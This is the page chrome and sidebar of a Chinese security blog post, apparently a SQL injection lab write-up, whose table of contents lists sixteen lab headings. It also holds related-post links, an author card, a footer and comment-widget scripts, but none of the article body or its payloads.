href="/2019/07/05/%E5%A6%82%E4%BD%95%E4%B8%BA%E7%BA%A2%E9%98%9F%E5%A4%A7%E4%BD%AC%E7%AB%AF%E8%8C%B6%E5%80%92%E6%B0%B4%E4%B8%8A%E7%BA%BFcs/"><img class="prev-cover" src="/2019/07/05/%E5%A6%82%E4%BD%95%E4%B8%BA%E7%BA%A2%E9%98%9F%E5%A4%A7%E4%BD%AC%E7%AB%AF%E8%8C%B6%E5%80%92%E6%B0%B4%E4%B8%8A%E7%BA%BFcs/index.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">如何为红队大佬端茶倒水上线cs</div></div></a></div><div class="next-post pull-right"><a href="/2019/07/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98xxe%E5%8F%8A%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src="/2019/07/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98xxe%E5%8F%8A%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E5%AD%A6%E4%B9%A0/index.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">记一次实战xxe及弱口令爆破学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2019/07/05/burpsuite实验室ssrf通关记录/" title="burpsuite实验室ssrf通关记录"><img class="cover" src="/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-07-05</div><div class="title">burpsuite实验室ssrf通关记录</div></div></a></div><div><a href="/2019/07/05/burpsuite实验室xxe漏洞通关记录/" title="burpsuite实验室xxe漏洞通关及知识点讲解"><img class="cover" src="/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4xxe%E6%BC%8F%E6%B4%9E%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-07-05</div><div class="title">burpsuite实验室xxe漏洞通关及知识点讲解</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h11ba1</div><div class="author-info__description">网络安全爱好者，一个正直的白帽子</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h1iba1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h1iba1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:h11ba1@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">好好学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-WHERE%E5%AD%90%E5%8F%A5%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%85%81%E8%AE%B8%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE"><span class="toc-number">1.</span> <span class="toc-text">1.WHERE子句中的SQL注入漏洞允许检索隐藏数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%85%81%E8%AE%B8%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">2.SQL注入漏洞允许登录绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-SQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">3.SQL注入UNION攻击，确定查询返回的列数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-SQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E6%9F%A5%E6%89%BE%E5%8C%85%E5%90%AB%E6%96%87%E6%9C%AC%E7%9A%84%E5%88%97"><span class="toc-number">4.</span> <span class="toc-text">4.SQL注入UNION攻击，查找包含文本的列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-SQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BB%8E%E5%85%B6%E4%BB%96%E8%A1%A8%E4%B8%AD%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE"><span class="toc-number">5.</span> <span class="toc-text">5.SQL注入UNION攻击，从其他表中检索数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-SQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E5%9C%A8%E5%8D%95%E4%B8%AA%E5%88%97%E4%B8%AD%E6%A3%80%E7%B4%A2%E5%A4%9A%E4%B8%AA%E5%80%BC"><span class="toc-number">6.</span> <span class="toc-text">6.SQL注入UNION攻击，在单个列中检索多个值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%8C%E5%9C%A8Oracle%E4%B8%8A%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%89%88%E6%9C%AC"><span class="toc-number">7.</span> <span class="toc-text">7.SQL注入攻击，在Oracle上查询数据库类型和版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%8C%E5%9C%A8MySQL%E5%92%8CMicrosoft%E4%B8%8A%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%89%88%E6%9C%AC"><span class="toc-number">8.</span> <span class="toc-text">8.SQL注入攻击，在MySQL和Microsoft上查询数据库类型和版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%8C%E5%88%97%E5%87%BA%E9%9D%9EOracle%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9"><span class="toc-number">9.</span> <span class="toc-text">9.SQL注入攻击，列出非Oracle数据库上的数据库内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%8C%E5%88%97%E5%87%BAOracle%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9"><span class="toc-number">10.</span> <span class="toc-text">10.SQL注入攻击，列出Oracle上的数据库内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E5%B8%A6%E6%9D%A1%E4%BB%B6%E9%94%99%E8%AF%AF%E7%9A%84%E7%9B%B2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">11.带条件错误的盲SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-%E5%B8%A6%E6%9D%A1%E4%BB%B6%E5%93%8D%E5%BA%94%E7%9A%84%E7%9B%B2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text">12.带条件响应的盲SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-%E5%85%B7%E6%9C%89%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9A%84%E7%9B%B2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">13.</span> <span class="toc-text">13.具有时间延迟的盲SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-%E5%85%B7%E6%9C%89%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E5%92%8C%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2%E5%8A%9F%E8%83%BD%E7%9A%84%E7%9B%B2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">14.</span> <span class="toc-text">14.具有时间延迟和信息检索功能的盲SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84%E7%9B%B2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">15.带外交互的盲SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE%E6%B8%97%E9%80%8F%E7%9A%84%E7%9B%B2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">16.</span> <span class="toc-text">16.带外数据渗透的盲SQL注入</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/01/arl_poc%E7%BC%96%E5%86%99/" title="arl_poc编写"><img src="/2021/07/01/arl_poc%E7%BC%96%E5%86%99/index.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="arl_poc编写"/></a><div class="content"><a class="title" href="/2021/07/01/arl_poc%E7%BC%96%E5%86%99/" title="arl_poc编写">arl_poc编写</a><time datetime="2021-07-01T13:04:49.000Z" title="发表于 2021-07-01 21:04:49">2021-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/05/hugo+github%20page%E6%90%AD%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E7%9A%84https%E5%8D%9A%E5%AE%A2/" title="hugo+github page搭建自定义域名的https博客"><img src="/2021/06/05/hugo+github%20page%E6%90%AD%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E7%9A%84https%E5%8D%9A%E5%AE%A2/index.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hugo+github page搭建自定义域名的https博客"/></a><div class="content"><a class="title" href="/2021/06/05/hugo+github%20page%E6%90%AD%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E7%9A%84https%E5%8D%9A%E5%AE%A2/" title="hugo+github page搭建自定义域名的https博客">hugo+github page搭建自定义域名的https博客</a><time datetime="2021-06-05T13:04:49.000Z" title="发表于 2021-06-05 21:04:49">2021-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/05/1.webgoat%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/" title="1.webgoat环境构建"><img src="/2020/07/05/1.webgoat%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/index.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="1.webgoat环境构建"/></a><div class="content"><a class="title" href="/2020/07/05/1.webgoat%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA/" title="1.webgoat环境构建">1.webgoat环境构建</a><time datetime="2020-07-05T13:04:49.000Z" title="发表于 2020-07-05 21:04:49">2020-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/05/3.sql%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/" title="3.sql注入模块审计"><img src="/2020/07/05/3.sql%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/index.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="3.sql注入模块审计"/></a><div class="content"><a class="title" href="/2020/07/05/3.sql%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/" title="3.sql注入模块审计">3.sql注入模块审计</a><time datetime="2020-07-05T13:04:49.000Z" title="发表于 2020-07-05 21:04:49">2020-07-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/05/2.%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/" title="2.登录注册模块审计"><img src="/2020/07/05/2.%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/index.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2.登录注册模块审计"/></a><div class="content"><a class="title" href="/2020/07/05/2.%E7%99%BB%E5%BD%95%E6%B3%A8%E5%86%8C%E6%A8%A1%E5%9D%97%E5%AE%A1%E8%AE%A1/" title="2.登录注册模块审计">2.登录注册模块审计</a><time datetime="2020-07-05T13:04:49.000Z" title="发表于 2020-07-05 21:04:49">2020-07-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> h11ba1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '9RpBEBK73wLE1cR6CXCiAnjb-gzGzoHsz',
+      appKey: 'e737ft98xMdDGv5szsTCmX7i',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script data-pjax src="https://cdn.jsdelivr.net/gh/tzy13755126023/tzy13755126023.github.io/js/chocolate.js"></script> <script async src="https://cdn.jsdelivr.net/gh/tzy13755126023/tzy13755126023.github.io/js/cursor.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
